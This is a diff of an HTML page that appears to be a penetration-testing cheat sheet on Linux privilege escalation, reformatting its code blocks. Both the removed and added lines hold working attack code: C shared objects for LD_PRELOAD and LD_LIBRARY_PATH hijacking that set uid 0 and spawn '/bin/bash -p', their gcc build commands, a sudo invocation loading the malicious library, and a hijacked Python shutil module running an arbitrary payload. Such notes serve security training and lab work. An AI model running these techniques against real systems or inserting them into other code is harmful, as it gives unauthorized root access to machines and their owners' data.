@@ -196,6 +196,8 @@ layout: default
         <li>pspy</li>
     </ul>
 
+    <hr>
+    
     <h2>File transfer</h2>
 
     <li>Download to Linux</li>
@@ -452,18 +454,7 @@ layout: default
             <li>If LD_PRELOAD is set it will load whatever shared object is set before anything else.</li>
             <ul>
                 <li>Create malicious shared object</li>
-                <pre>
-                    #include &lt;stdio.h&gt;
-                    #include &lt;sys/types.h&gt;
-                    #include &lt;stdlib.h&gt;
-                    void _init() {
-                        unsetenv(&quot;LD_PRELOAD&quot;);
-                        setresuid(0,0,0);
-                        system(&quot;/bin/bash -p&quot;);
-                    }
-                    
-                    #gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
-                </pre>
+                <pre>&#13;&#10;#include &lt;stdio.h&gt;&#13;&#10;#include &lt;sys/types.h&gt;&#13;&#10;#include &lt;stdlib.h&gt;&#13;&#10;void _init() {&#13;&#10;    unsetenv(&quot;LD_PRELOAD&quot;);&#13;&#10;    setresuid(0,0,0);&#13;&#10;    system(&quot;/bin/bash -p&quot;);&#13;&#10;}&#13;&#10;&#13;&#10;#gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c&#13;&#10;                </pre>
             </ul>
             <li>Run any sudo enabled command:</li>
             <ul>
@@ -486,17 +477,7 @@ layout: default
                 <li>ldd /usr/bin/apache2</li>
                 <li>Output: shared objects, choose one to replace</li>
                 <li>Create a file to compile that will replace the original shared object </li>
-                <pre>
-                    #include &lt;stdio.h&gt;
-                    #include &lt;stdlib.h&gt;
-                    static void hijack() __attribute__((constructor));
-                    void hijack() {unsetenv(&quot;LD_LIBRARY_PATH&quot;);
-                        setresuid(0,0,0);
-                        system(&quot;/bin/bash -p&quot;);
-                    }
-                    
-                    #gcc -o &lt;Malicious .so&gt; -shared -fPIC library_path.c  
-                </pre>
+                <pre>&#13;&#10;#include &lt;stdio.h&gt;&#13;&#10;#include &lt;stdlib.h&gt;&#13;&#10;static void hijack() __attribute__((constructor));&#13;&#10;void hijack() {unsetenv(&quot;LD_LIBRARY_PATH&quot;);&#13;&#10;    setresuid(0,0,0);&#13;&#10;    system(&quot;/bin/bash -p&quot;);&#13;&#10;}&#13;&#10;&#13;&#10;#gcc -o &lt;Malicious .so&gt; -shared -fPIC library_path.c  &#13;&#10;                </pre>
                 <li>run command</li>
                 <ul>
                     <li>sudo LD_LIBRARY_PATH=&lt;Malicious .so directory&gt; &lt;sudo command&gt;</li>
@@ -719,13 +700,7 @@ layout: default
                             </ul>
                         </td>
                         <td>
-                            <pre>
-        (Removed irrelevant code)
-"….then
-        echo 'Running backup script in the background, it might take a while…'
-        /opt/scripts/backup.py &….."
-        (Removed irrelevant code)
-                            </pre>
+                            <pre>&#13;&#10;        (Removed irrelevant code)&#13;&#10;&quot;&mldr;.then&#13;&#10;        echo &apos;Running backup script in the background, it might take a while&mldr;&apos;&#13;&#10;        /opt/scripts/backup.py &amp;&mldr;..&quot;&#13;&#10;        (Removed irrelevant code)&#13;&#10;                            </pre>
                         </td>
                     </tr>
                     <tr>
@@ -736,14 +711,7 @@ layout: default
                             </ul>
                         </td>
                         <td>
-                            <pre>
-#!/usr/bin/python3
-    (Removed irrelevant code)
-from shutil import make_archive
-   (Removed irrelevant code)
-…make_archive(dst, 'gztar', src)
-   (Removed irrelevant code)
-                            </pre>
+                            <pre>&#13;&#10;#!/usr/bin/python3&#13;&#10;    (Removed irrelevant code)&#13;&#10;from shutil import make_archive&#13;&#10;   (Removed irrelevant code)&#13;&#10;&mldr;make_archive(dst, &apos;gztar&apos;, src)&#13;&#10;   (Removed irrelevant code)&#13;&#10;                            </pre>
                         </td>
                     </tr>
                 </table>
@@ -752,9 +720,7 @@ from shutil import make_archive
         <tr>
             <td>Create malicious module - shutil.py</td>
             <td>
-                <pre>
-import os&#13;&#10;&#13;&#10;def make_archive(a, b, c):&#13;&#10;os.system(&quot;&lt;malicious payload&quot;);
-                </pre>
+                <pre>&#13;&#10;import os&#13;&#10;&#13;&#10;def make_archive(a, b, c):&#13;&#10;os.system(&quot;&lt;malicious payload&quot;);&#13;&#10;                </pre>
             </td>
         </tr>
     </table>
